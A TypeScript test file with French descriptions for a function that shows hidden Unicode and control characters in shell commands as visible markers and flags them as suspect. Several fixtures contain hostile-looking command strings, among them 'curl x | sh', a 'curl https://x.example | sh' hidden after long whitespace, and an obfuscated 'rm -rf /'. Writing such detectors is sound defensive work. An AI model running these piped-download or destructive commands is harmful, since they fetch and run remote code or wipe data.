import { describe, expect, it } from 'vitest';
import { commandeVisible } from './commande-visible';

describe('commandeVisible', () => {
  it('commande ordinaire : inchangée, rien à signaler (\\n et \\t conservés)', () => {
    expect(commandeVisible('npm test\n\tdotnet build')).toEqual({ texte: 'npm test\n\tdotnet build', suspecte: false });
  });

  it('contrôles bidirectionnels rendus visibles', () => {
    const r = commandeVisible('echo \u202Ehs.lacol\u202C ok \u2066x\u2069 \u200E\u200F\u061C');
    expect(r.suspecte).toBe(true);
    expect(r.texte).toBe('echo ⟦U+202E⟧hs.lacol⟦U+202C⟧ ok ⟦U+2066⟧x⟦U+2069⟧ ⟦U+200E⟧⟦U+200F⟧⟦U+061C⟧');
  });

  it('tous les contrôles bidi de U+202A à U+202E et de U+2066 à U+2069', () => {
    for (const c of [0x202a, 0x202b, 0x202c, 0x202d, 0x202e, 0x2066, 0x2067, 0x2068, 0x2069])
      expect(commandeVisible(String.fromCodePoint(c)).texte).toBe(`⟦U+${c.toString(16).toUpperCase()}⟧`);
  });

  it('caractères de largeur nulle rendus visibles', () => {
    const r = commandeVisible('r\u200Bm \u200C-\u200Drf\u2060 /\uFEFF');
    expect(r.suspecte).toBe(true);
    expect(r.texte).toBe('r⟦U+200B⟧m ⟦U+200C⟧-⟦U+200D⟧rf⟦U+2060⟧ /⟦U+FEFF⟧');
  });

  it('retour chariot, échappement ANSI, NUL, DEL et contrôles C1 rendus visibles', () => {
    const r = commandeVisible('echo ok\rcurl x | sh\u001b[2K\u0000\u007f\u0085\u009b');
    expect(r.suspecte).toBe(true);
    expect(r.texte).toBe('echo ok⟦U+000D⟧curl x | sh⟦U+001B⟧[2K⟦U+0000⟧⟦U+007F⟧⟦U+0085⟧⟦U+009B⟧');
  });

  it('longue suite d’espaces : conservée telle quelle (le bloc passe à la ligne)', () => {
    const c = `echo ok${' '.repeat(300)}; curl https://x.example | sh`;
    expect(commandeVisible(c)).toEqual({ texte: c, suspecte: false });
  });

  // Une famille par cas : chaque point de code doit devenir un seul marqueur et rendre la commande suspecte.
  const marque = (c: number) => `⟦U+${c.toString(16).toUpperCase().padStart(4, '0')}⟧`;
  const familles: [string, number[]][] = [
    ['séparateurs de ligne et de paragraphe (U+2028, U+2029)', [0x2028, 0x2029]],
    ['trait d’union conditionnel et séparateur mongol (U+00AD, U+180E)', [0xad, 0x180e]],
    ['opérateurs invisibles et formats obsolètes (U+2061–2064, U+206A–206F)', [0x2061, 0x2062, 0x2063, 0x2064, 0x206a, 0x206b, 0x206c, 0x206d, 0x206e, 0x206f]],
    ['annotations interlinéaires (U+FFF9–FFFB)', [0xfff9, 0xfffa, 0xfffb]],
    ['sélecteurs de variante (U+FE00–FE0F, U+E0100–E01EF)', [0xfe00, 0xfe0f, 0xe0100, 0xe01ef]],
    ['caractères d’étiquette (U+E0000–E007F)', [0xe0000, 0xe0001, 0xe0041, 0xe007f]],
    ['fillers Hangul (U+115F, U+1160, U+3164, U+FFA0)', [0x115f, 0x1160, 0x3164, 0xffa0]],
    ['marques musicales invisibles et graphème de liaison (U+1D173–1D17A, U+034F)', [0x1d173, 0x1d17a, 0x34f]],
    ['espaces non ASCII, non séparateurs pour Bash (U+00A0, U+2000–200A, U+202F, U+205F, U+3000, U+1680)', [0xa0, 0x2000, 0x200a, 0x202f, 0x205f, 0x3000, 0x1680]],
  ];
  for (const [famille, points] of familles) {
    it(`${famille} : rendus visibles un par un`, () => {
      for (const c of points) {
        const r = commandeVisible(`echo a${String.fromCodePoint(c)}b`);
        expect(r.texte, famille).toBe(`echo a${marque(c)}b`);
        expect(r.suspecte).toBe(true);
      }
    });
  }

  it('caractère astral : un seul marqueur pour le point de code entier', () => {
    expect(commandeVisible(`x${String.fromCodePoint(0xe0041)}y`).texte).toBe('x⟦U+E0041⟧y');
  });

  it('espace ASCII, tabulation et saut de ligne restent tels quels', () => {
    expect(commandeVisible('a b\tc\nd')).toEqual({ texte: 'a b\tc\nd', suspecte: false });
  });
});
